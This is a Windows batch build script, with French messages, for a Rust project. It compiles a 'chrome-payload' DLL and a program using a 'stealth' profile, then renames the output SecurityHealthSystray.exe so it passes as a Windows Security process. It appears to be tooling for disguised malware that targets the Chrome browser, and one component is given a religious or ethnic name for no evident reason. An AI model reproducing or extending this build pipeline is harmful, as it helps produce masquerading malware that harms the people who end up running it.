@echo off
setlocal
set "PATH=%USERPROFILE%\.cargo\bin;%PATH%"
cd /d "%~dp0"

echo === Diagnostic build ===
echo.

where rustc || echo [X] rustc absent
where cargo || echo [X] cargo absent
where cl || echo [X] cl.exe absent - ouvre "x64 Native Tools Command Prompt for VS"
where link || echo [X] link.exe absent
echo.

echo [1/2] chrome-payload...
cargo build --profile stealth -p chrome-payload
if errorlevel 1 goto end

if exist "target\stealth\chrome_payload.dll" (
    set "CHROME_PAYLOAD_DLL=%~dp0target\stealth\chrome_payload.dll"
) else if exist "target\stealth\deps\chrome_payload.dll" (
    set "CHROME_PAYLOAD_DLL=%~dp0target\stealth\deps\chrome_payload.dll"
) else (
    echo [X] chrome_payload.dll introuvable
    goto end
)
echo Payload: %CHROME_PAYLOAD_DLL%

echo.
echo [2/2] jewish...
cargo build --profile stealth -p jewish
if errorlevel 1 goto end

if not exist out mkdir out
copy /Y target\stealth\jewish.exe out\SecurityHealthSystray.exe
echo.
echo OK: out\SecurityHealthSystray.exe

:end
pause
